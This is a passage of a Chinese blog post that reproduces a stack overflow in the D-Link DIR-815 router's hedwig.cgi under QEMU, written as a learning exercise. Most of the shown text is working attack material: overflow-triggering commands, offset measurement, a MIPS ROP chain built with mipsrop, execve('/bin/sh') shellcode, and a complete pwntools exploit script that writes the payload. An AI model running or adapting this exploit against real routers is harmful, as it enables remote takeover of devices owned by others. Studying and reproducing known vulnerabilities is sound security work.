class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没有发现有什么漏洞点。我们再找找调用这个函数的位置，发现在hedwigcgi_main函数中有该函数的调用：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/09/lu-you-qi-xue-xi-zhi-d-link-dir-815-yi-chu-lou-dong-fu-xian/3.png"></div>我们看到在后面的sprintf造成了栈溢出漏洞。<p>实际上这里还有一个栈溢出漏洞:</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/09/lu-you-qi-xue-xi-zhi-d-link-dir-815-yi-chu-lou-dong-fu-xian/4.png"></div><p>由于没有size限制就可以无限格式化一个长字符串导致溢出，正常情况一般都会使用snprintf函数来完成指定一个size。</p><p><strong>POST具体数据可以通过类似输入流传入 ：echo “uid=aaa”| /htdocs/web/hedwig.cgi</strong></p><h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><h2 id="先看看偏移"><a href="#先看看偏移" class="headerlink" title="先看看偏移"></a>先看看偏移</h2><p>命令：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">chroot</span> <span class="token keyword">.</span> ./qemu-mipsel-static -E CONTENT_LENGTH<span class="token operator">=</span>20 -E CONTENT_TYPE<span class="token operator">=</span><span class="token string">"application/x-www-form-urlencoded"</span> -E REQUEST_METHOD<span class="token operator">=</span><span class="token string">"POST"</span> -E HTTP_COOKIE<span class="token operator">=</span>`python -c <span class="token string">"print 'uid=123'+'A'*0x600"</span>` -E REQUEST_URI<span class="token operator">=</span><span class="token string">"/hedwig.cgi"</span> -E REMOTE_ADDR<span class="token operator">=</span><span class="token string">"0.0.0.0"</span> -g 23946 ./htdocs/web/hedwig.cgi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>貌似是执行一次post请求？</p><div style="width:70%;margin:auto">{% asset_img 5.png %}</div>我们已经看到已经成功控制了返回地址。<div style="width:70%;margin:auto">{% asset_img 6.png %}</div><p>我们看到栈溢出已经成功了，我们看看栈溢出的长度</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">chroot</span> <span class="token keyword">.</span> ./qemu-mipsel-static -E CONTENT_LENGTH<span class="token operator">=</span>20 -E CONTENT_TYPE<span class="token operator">=</span><span class="token string">"application/x-www-form-urlencoded"</span> -E REQUEST_METHOD<span class="token operator">=</span><span class="token string">"POST"</span> -E HTTP_COOKIE<span class="token operator">=</span>`python -c <span class="token string">"print 'uid=123'+'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaandaaneaanfaangaanhaaniaanjaankaanlaanmaannaanoaanpaanqaanraansaantaanuaanvaanwaanxaanyaanzaaobaaocaaodaaoeaaofaaogaaohaaoiaaojaaokaaolaaomaaonaaooaaopaaoqaaoraaosaaotaaouaaovaaowaaoxaaoyaaozaapbaapcaapdaapeaapfaapgaaphaapiaapjaapkaaplaapmaapnaapoaappaapqaapraapsaaptaapuaapvaapwaapxaapyaapzaaqbaaqcaaqdaaqeaaqfaaqgaaqhaaqiaaqjaaqkaaqlaaqmaaqnaaqoaaqpaaqqaaqraaqsaaqtaaquaaqvaaqwaaqxaaqyaaqzaarbaarcaardaareaarfaargaarhaariaarjaarkaarlaarmaarnaaroaarpaarqaarraarsaartaaruaarvaarwaarxaaryaarzaasbaascaasdaaseaasfaasgaashaasiaasjaaskaaslaasmaasnaasoaaspaasqaasraassaastaasuaasvaaswaasxaasyaaszaatbaatcaatdaateaatfaatgaathaatiaatjaatkaatlaatmaatnaatoaatpaatqaatraatsaattaatuaatvaatwaatxaatyaat'"</span>` -E REQUEST_URI<span class="token operator">=</span><span class="token string">"/hedwig.cgi"</span> -E REMOTE_ADDR<span class="token operator">=</span><span class="token string">"0.0.0.0"</span> -g 23946 ./htdocs/web/hedwig.cgi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/09/lu-you-qi-xue-xi-zhi-d-link-dir-815-yi-chu-lou-dong-fu-xian/7.png"></div><p>溢出长度为1040字节</p><p>在这之前我们需要看看其各段信息，我们发现gdb中vmmap指令不管用，于是通过proc中进程信息来查看：<br>这里明明是32位程序却打印出了64位内存布局……</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/09/lu-you-qi-xue-xi-zhi-d-link-dir-815-yi-chu-lou-dong-fu-xian/8.png"></div><p>先利用参考资料中：libc 的基地址 0x76738000</p><p>通过加载的这个libc来找gadgets</p><h2 id="调试优化"><a href="#调试优化" class="headerlink" title="调试优化"></a>调试优化</h2><p>调试脚本test.sh</p><p>调试脚本test.sh，其中需要sudo chroot 到文件系统下，然后利用qemu-mipsel-static用户模式进行调试，-E是对应环境变量的参数。-g 指定调试端口，“2&gt; /dev/null” 代表忽略掉错误提示信息。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#/bin/bash</span>test<span class="token operator">=</span><span class="token punctuation">$(</span>python -c <span class="token string">"print 'uid='+open('test','r').read(2000)"</span><span class="token punctuation">)</span>LEN<span class="token operator">=</span><span class="token punctuation">$(</span>echo -n <span class="token string">"<span class="token variable">$test</span>"</span> <span class="token operator">|</span> <span class="token function">wc</span> -c<span class="token punctuation">)</span>PORT<span class="token operator">=</span><span class="token string">"23957"</span><span class="token function">cp</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">which</span> qemu-mipsel-static<span class="token variable">)</span></span> ./qemu<span class="token function">sudo</span> <span class="token function">chroot</span> <span class="token keyword">.</span> ./qemu -E CONTENT_LENGTH<span class="token operator">=</span><span class="token variable">$LEN</span> -E CONTENT_TYPE<span class="token operator">=</span><span class="token string">"application/x-www-form-urlencoded"</span> -E REQUEST_METHOD<span class="token operator">=</span><span class="token string">"POST"</span> -E HTTP_COOKIE<span class="token operator">=</span><span class="token variable">$test</span> -E REQUEST_URL<span class="token operator">=</span><span class="token string">"/hedwig.cgi"</span> -E REMOTE_ADDR<span class="token operator">=</span><span class="token string">"127.0.0.1"</span> -g <span class="token variable">$PORT</span> /htdocs/web/hedwig.cgi 2<span class="token operator">></span>/dev/null<span class="token function">rm</span> -f ./qemu<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这之前需要利用patternLocOffset.py生成test文件，包含特定格式的2000个字符串。patternLocOffset.py是一个已实现的小工具。</p><pre class="line-numbers language-bash"><code class="language-bash">python patternLocOffset.py -c -l 2000 -f <span class="token function">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>重新触发两个栈溢出：</p><p><strong>第一个栈溢出</strong>：</p><p>test脚本：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#/bin/bash</span>test<span class="token operator">=</span><span class="token punctuation">$(</span>python -c <span class="token string">"print 'uid='+open('test','r').read(2000)"</span><span class="token punctuation">)</span>LEN<span class="token operator">=</span><span class="token punctuation">$(</span>echo -n <span class="token string">"<span class="token variable">$test</span>"</span> <span class="token operator">|</span> <span class="token function">wc</span> -c<span class="token punctuation">)</span>PORT<span class="token operator">=</span><span class="token string">"23957"</span><span class="token function">sudo</span> <span class="token function">chroot</span> <span class="token keyword">.</span> ./qemu-mipsel-static -E CONTENT_LENGTH<span class="token operator">=</span><span class="token variable">$LEN</span> -E CONTENT_TYPE<span class="token operator">=</span><span class="token string">"application/x-www-form-urlencoded"</span> -E REQUEST_METHOD<span class="token operator">=</span><span class="token string">"POST"</span> -E HTTP_COOKIE<span class="token operator">=</span><span class="token variable">$test</span> -E REQUEST_URL<span class="token operator">=</span><span class="token string">"/hedwig.cgi"</span> -E REMOTE_ADDR<span class="token operator">=</span><span class="token string">"127.0.0.1"</span> -g <span class="token variable">$PORT</span> /htdocs/web/hedwig.cgi 2<span class="token operator">></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成payload文件test：</p><pre class="line-numbers language-bash"><code class="language-bash">python patternLocOffset.py -c -l 2000 -f <span class="token function">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><div style="width:70%;margin:auto">{% asset_img 9.png %}</div><p><strong>第二个栈溢出</strong>：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token comment" spellcheck="true">#sudo ./test.sh  "uid=1234"  `python -c "print 'uid=' + open('content','r').read()"`</span>INPUT<span class="token operator">=</span><span class="token string">"<span class="token variable">$1</span>"</span>COOKIE<span class="token operator">=</span><span class="token string">"<span class="token variable">$2</span>"</span>PORT<span class="token operator">=</span><span class="token string">"23957"</span>LEN<span class="token operator">=</span><span class="token punctuation">$(</span>echo -n <span class="token string">"<span class="token variable">$INPUT</span>"</span> <span class="token operator">|</span> <span class="token function">wc</span> -c<span class="token punctuation">)</span><span class="token function">cp</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">which</span> qemu-mipsel-static<span class="token variable">)</span></span> ./qemu<span class="token keyword">echo</span> <span class="token variable">$INPUT</span> <span class="token operator">|</span> <span class="token function">chroot</span> <span class="token keyword">.</span> ./qemu -E CONTENT_LENGTH<span class="token operator">=</span><span class="token variable">$LEN</span> -E CONTENT_TYPE<span class="token operator">=</span><span class="token string">"application/x-www-form-urlencoded"</span> -E REQUEST_METHOD<span class="token operator">=</span><span class="token string">"POST"</span> -E HTTP_COOKIE<span class="token operator">=</span><span class="token variable">$COOKIE</span> -E REQUEST_URI<span class="token operator">=</span><span class="token string">"/hedwig.cgi"</span> -E REMOTE_ADDR<span class="token operator">=</span><span class="token string">"127.0.0.1"</span>  -g <span class="token variable">$PORT</span> /htdocs/web/hedwig.cgi<span class="token function">rm</span> -f ./qemu<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行命令</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> ./test.sh  <span class="token string">"uid=1234"</span>  `python -c <span class="token string">"print 'uid=' + open('test','r').read()"</span>`<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第二个栈溢出好像触发不了…</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><p>通过两个方式来getshell</p><h2 id="exp1-shellcode"><a href="#exp1-shellcode" class="headerlink" title="exp1 shellcode"></a>exp1 shellcode</h2><p>有一个常规的rop链：执行的整体流程为 sleep(1) -&gt; read_value_from_stack -&gt; jump to stack(shellcode)</p><p>这里详细讲讲为什么要执行sleep(1)：</p><p>MIPS CPUs有两个独立的cache：指令cache和数据cache。指令和数据分别在两个不同的缓存中。当缓存满了，会触发flush，将数据写回到主内存。攻击者的攻击payload通常会被应用当做数据来处理，存储在数据缓存中。当payload触发漏洞，劫持程序执行流程的时候，会去执行内存中的shellcode。如果数据缓存没有触发flush的话，shellcode依然存储在缓存中，而没有写入主内存。这会导致程序执行了本该存储shellcode的地址处随机的代码，导致不可预知的后果。</p><p>最简单可靠的让缓存数据写入内存的方式是调用一个堵塞函数。比如sleep(1)或者其他类似的函数。sleep的过程中，处理器会切换上下文让给其他正在执行的程序，缓存会自动执行flush。</p><p><strong>简单的来说就是可能shellcode并没有写进去，导致执行未知数据的问题</strong></p><p>我们在IDA 7.0下使用mipsrop：</p><p><strong>mipsrop.find(“li $a0,1”)</strong></p><div style="width:70%;margin:auto">{% asset_img 10.png %}</div><div style="width:70%;margin:auto">{% asset_img 11.png %}</div><p>mipsrop.tail()：该指令作用是打印出所有函数尾部调用的gadget，这些gadget对函数调用很有效。因为非叶子函数尾部一般是将栈中值返回给寄存器然后再跳转。</p><p>0x57e50处将跳转到寄存器t9中的值，而t9寄存器时通过s1寄存器来传值的。</p><div style="width:70%;margin:auto">{% asset_img 12.png %}</div><p>此时payload：</p><pre class="line-numbers language-python"><code class="language-python">base_addr <span class="token operator">=</span> <span class="token number">0x76738000</span>rop1 <span class="token operator">=</span> <span class="token number">0x3e524</span> <span class="token comment" spellcheck="true"># .text:0003E524 move    $t9, $s2</span><span class="token comment" spellcheck="true">#.text:0003E528 lw      $ra, 0x28+var_4($sp)</span><span class="token comment" spellcheck="true">#.text:0003E52C lw      $s2, 0x28+var_8($sp)</span><span class="token comment" spellcheck="true">#.text:0003E530 lw      $s1, 0x28+var_C($sp)</span><span class="token comment" spellcheck="true">#.text:0003E534 lw      $s0, 0x28+var_10($sp)</span><span class="token comment" spellcheck="true">#.text:0003E538 jr     </span>payload <span class="token operator">=</span> <span class="token string">"uid="</span><span class="token operator">+</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">973</span>payload<span class="token operator">+=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>base_addr <span class="token operator">+</span> rop1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s0 s1</span>payload<span class="token operator">+=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">28</span> <span class="token comment" spellcheck="true"># s2~s7 fp</span>rop2 <span class="token operator">=</span> <span class="token number">0x57e50</span><span class="token comment" spellcheck="true">#.text:00057E50 li      $a0, 1</span><span class="token comment" spellcheck="true">#.text:00057E54 move    $t9, $s1</span><span class="token comment" spellcheck="true">#.text:00057E58 jalr   </span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_addr<span class="token operator">+</span>rop2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>填充ra寄存器：</p><p>0003E528 lw      $ra, 0x28+var_4( $sp)</p><p>sp 和 ra 寄存器的距离为 0x24，所以这里的填充为 0x24，后面的四个字节就是 ra 寄存器的值</p><p>那么这样的话s2填充为sleep函数地址，ra则为下一个gadget地址，这样可以执行完sleep(1)函数后执行gadgets。sleep函数通过在IDA里面查看得知偏移是0x56bd0</p><p>payload更新：</p><pre class="line-numbers language-python"><code class="language-python">base_addr <span class="token operator">=</span> <span class="token number">0x76738000</span>rop1 <span class="token operator">=</span> <span class="token number">0x3e524</span> <span class="token comment" spellcheck="true"># .text:0003E524 move    $t9, $s2</span><span class="token comment" spellcheck="true">#.text:0003E528 lw      $ra, 0x28+var_4($sp)</span><span class="token comment" spellcheck="true">#.text:0003E52C lw      $s2, 0x28+var_8($sp)</span><span class="token comment" spellcheck="true">#.text:0003E530 lw      $s1, 0x28+var_C($sp)</span><span class="token comment" spellcheck="true">#.text:0003E534 lw      $s0, 0x28+var_10($sp)</span><span class="token comment" spellcheck="true">#.text:0003E538 jr     </span>payload <span class="token operator">=</span> <span class="token string">"uid="</span><span class="token operator">+</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">973</span>payload<span class="token operator">+=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>base_addr <span class="token operator">+</span> rop1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s0 s1</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_addr<span class="token operator">+</span>sleep_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s2</span>payload<span class="token operator">+=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">24</span> <span class="token comment" spellcheck="true"># s3~s7 fp</span>rop2 <span class="token operator">=</span> <span class="token number">0x57e50</span><span class="token comment" spellcheck="true">#.text:00057E50 li      $a0, 1</span><span class="token comment" spellcheck="true">#.text:00057E54 move    $t9, $s1</span><span class="token comment" spellcheck="true">#.text:00057E58 jalr   </span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_addr<span class="token operator">+</span>rop2<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用mipsrop.stackfinder()找gadgets，也就是赋值完stack后又jmp到一个gadgets。（因为s1可控）</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/09/lu-you-qi-xue-xi-zhi-d-link-dir-815-yi-chu-lou-dong-fu-xian/13.png"></div><p>最后再寻找mipsrop.find(“mov $t9,$a1”)找到可以跳到a1寄存器的指令</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/12/09/lu-you-qi-xue-xi-zhi-d-link-dir-815-yi-chu-lou-dong-fu-xian/14.png"></div><p>调用shellcode的payload</p><pre class="line-numbers language-python"><code class="language-python">rop3 <span class="token operator">=</span> <span class="token number">0xb814</span><span class="token comment" spellcheck="true"># .text:0000B814 addiu   $a1, $sp, 0x168+var_150</span><span class="token comment" spellcheck="true"># .text:0000B818 move    $t9, $s1</span><span class="token comment" spellcheck="true"># .text:0000B81C jalr    $t9 ; st</span>rop4 <span class="token operator">=</span> <span class="token number">0x37e6c</span><span class="token comment" spellcheck="true"># .text:00037E6C move    $t9, $a1</span><span class="token comment" spellcheck="true"># .text:00037E70 addiu   $a0, 0x4C  # 'L'</span><span class="token comment" spellcheck="true"># .text:00037E74 jr      $t</span>payload<span class="token operator">+=</span> <span class="token string">"b"</span><span class="token operator">*</span><span class="token number">0x1c</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>rop4<span class="token operator">+</span>base_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s1</span>payload<span class="token operator">+=</span> <span class="token string">"b"</span><span class="token operator">*</span><span class="token number">4</span>     <span class="token comment" spellcheck="true"># s2</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_addr<span class="token operator">+</span>rop3<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># ra</span>shellcode <span class="token operator">=</span> <span class="token string">"\xff\xff\x06\x28"</span>  <span class="token comment" spellcheck="true"># slti $a2, $zero, -1</span>shellcode <span class="token operator">+=</span> <span class="token string">"\x62\x69\x0f\x3c"</span>  <span class="token comment" spellcheck="true"># lui $t7, 0x6962</span>shellcode <span class="token operator">+=</span> <span class="token string">"\x2f\x2f\xef\x35"</span>  <span class="token comment" spellcheck="true"># ori $t7, $t7, 0x2f2f</span>shellcode <span class="token operator">+=</span> <span class="token string">"\xf4\xff\xaf\xaf"</span>  <span class="token comment" spellcheck="true"># sw $t7, -0xc($sp)</span>shellcode <span class="token operator">+=</span> <span class="token string">"\x73\x68\x0e\x3c"</span>  <span class="token comment" spellcheck="true"># lui $t6, 0x6873</span>shellcode <span class="token operator">+=</span> <span class="token string">"\x6e\x2f\xce\x35"</span>  <span class="token comment" spellcheck="true"># ori $t6, $t6, 0x2f6e</span>shellcode <span class="token operator">+=</span> <span class="token string">"\xf8\xff\xae\xaf"</span>  <span class="token comment" spellcheck="true"># sw $t6, -8($sp)</span>shellcode <span class="token operator">+=</span> <span class="token string">"\xfc\xff\xa0\xaf"</span>  <span class="token comment" spellcheck="true"># sw $zero, -4($sp)</span>shellcode <span class="token operator">+=</span> <span class="token string">"\xf4\xff\xa4\x27"</span>  <span class="token comment" spellcheck="true"># addiu $a0, $sp, -0xc</span>shellcode <span class="token operator">+=</span> <span class="token string">"\xff\xff\x05\x28"</span>  <span class="token comment" spellcheck="true"># slti $a1, $zero, -1</span>shellcode <span class="token operator">+=</span> <span class="token string">"\xab\x0f\x02\x24"</span>  <span class="token comment" spellcheck="true"># addiu;$v0, $zero, 0xfab</span>shellcode <span class="token operator">+=</span> <span class="token string">"\x0c\x01\x01\x01"</span>  <span class="token comment" spellcheck="true"># syscall 0x40404</span>payload<span class="token operator">+=</span> <span class="token string">"d"</span><span class="token operator">*</span><span class="token number">0x18</span>payload<span class="token operator">+=</span> shellcode<span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"payload"</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>完整exp</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>endian<span class="token operator">=</span><span class="token string">"little"</span>context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">"mips"</span>base_addr <span class="token operator">=</span> <span class="token number">0x76738000</span>sleep_addr <span class="token operator">=</span> <span class="token number">0x56bd0</span>system_addr <span class="token operator">=</span> <span class="token number">0x53200</span>rop1 <span class="token operator">=</span> <span class="token number">0x3e524</span> <span class="token comment" spellcheck="true"># .text:0003E524 move    $t9, $s2</span><span class="token comment" spellcheck="true">#.text:0003E528 lw      $ra, 0x28+var_4($sp)</span><span class="token comment" spellcheck="true">#.text:0003E52C lw      $s2, 0x28+var_8($sp)</span><span class="token comment" spellcheck="true">#.text:0003E530 lw      $s1, 0x28+var_C($sp)</span><span class="token comment" spellcheck="true">#.text:0003E534 lw      $s0, 0x28+var_10($sp)</span><span class="token comment" spellcheck="true">#.text:0003E538 jr    </span>payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x3cb</span><span class="token operator">+</span><span class="token number">12</span><span class="token operator">+</span><span class="token number">0x30</span><span class="token operator">-</span><span class="token number">0x18</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>base_addr <span class="token operator">+</span> rop1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s0 s1</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_addr<span class="token operator">+</span>sleep_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s2</span>payload<span class="token operator">+=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">24</span> <span class="token comment" spellcheck="true"># s3~s7 fp</span>rop2 <span class="token operator">=</span> <span class="token number">0x57e50</span><span class="token comment" spellcheck="true">#.text:00057E50 li      $a0, 1</span><span class="token comment" spellcheck="true">#.text:00057E54 move    $t9, $s1</span><span class="token comment" spellcheck="true">#.text:00057E58 jalr   </span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_addr<span class="token operator">+</span>rop2<span class="token punctuation">)</span>rop3 <span class="token operator">=</span> <span class="token number">0xb814</span><span class="token comment" spellcheck="true"># .text:0000B814 addiu   $a1, $sp, 0x168+var_150</span><span class="token comment" spellcheck="true"># .text:0000B818 move    $t9, $s1</span><span class="token comment" spellcheck="true"># .text:0000B81C jalr    $t9 ; st</span>rop4 <span class="token operator">=</span> <span class="token number">0x37e6c</span><span class="token comment" spellcheck="true"># .text:00037E6C move    $t9, $a1</span><span class="token comment" spellcheck="true"># .text:00037E70 addiu   $a0, 0x4C  # 'L'</span><span class="token comment" spellcheck="true"># .text:00037E74 jr      $t</span>payload<span class="token operator">+=</span> <span class="token string">"b"</span><span class="token operator">*</span><span class="token number">0x1c</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>rop4<span class="token operator">+</span>base_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s1</span>payload<span class="token operator">+=</span> <span class="token string">"b"</span><span class="token operator">*</span><span class="token number">4</span>     <span class="token comment" spellcheck="true"># s2</span>payload<span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_addr<span class="token operator">+</span>rop3<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># ra</span>shellcode <span class="token operator">=</span> <span class="token string">"\xff\xff\x06\x28"</span>  <span class="token comment" spellcheck="true"># slti $a2, $zero, -1</span>shellcode <span class="token operator">+=</span> <span class="token string">"\x62\x69\x0f\x3c"</span>  <span class="token comment" spellcheck="true"># lui $t7, 0x6962</span>shellcode <span class="token operator">+=</span> <span class="token string">"\x2f\x2f\xef\x35"</span>  <span class="token comment" spellcheck="true"># ori $t7, $t7, 0x2f2f</span>shellcode <span class="token operator">+=</span> <span class="token string">"\xf4\xff\xaf\xaf"</span>  <span class="token comment" spellcheck="true"># sw $t7, -0xc($sp)</span>shellcode <span class="token operator">+=</span> <span class="token string">"\x73\x68\x0e\x3c"</span>  <span class="token comment" spellcheck="true"># lui $t6, 0x6873</span>shellcode <span class="token operator">+=</span> <span class="token string">"\x6e\x2f\xce\x35"</span>  <span class="token comment" spellcheck="true"># ori $t6, $t6, 0x2f6e</span>shellcode <span class="token operator">+=</span> <span class="token string">"\xf8\xff\xae\xaf"</span>  <span class="token comment" spellcheck="true"># sw $t6, -8($sp)</span>shellcode <span class="token operator">+=</span> <span class="token string">"\xfc\xff\xa0\xaf"</span>  <span class="token comment" spellcheck="true"># sw $zero, -4($sp)</span>shellcode <span class="token operator">+=</span> <span class="token string">"\xf4\xff\xa4\x27"</span>  <span class="token comment" spellcheck="true"># addiu $a0, $sp, -0xc</span>shellcode <span class="token operator">+=</span> <span class="token string">"\xff\xff\x05\x28"</span>  <span class="token comment" spellcheck="true"># slti $a1, $zero, -1</span>shellcode <span class="token operator">+=</span> <span class="token string">"\xab\x0f\x02\x24"</span>  <span class="token comment" spellcheck="true"># addiu;$v0, $zero, 0xfab</span>shellcode <span class="token operator">+=</span> <span class="token string">"\x0c\x01\x01\x01"</span>  <span class="token comment" spellcheck="true"># syscall 0x40404</span>payload<span class="token operator">+=</span> <span class="token string">"d"</span><span class="token operator">*</span><span class="token number">0x18</span>payload<span class="token operator">+=</span> shellcode<span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"payload"</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" 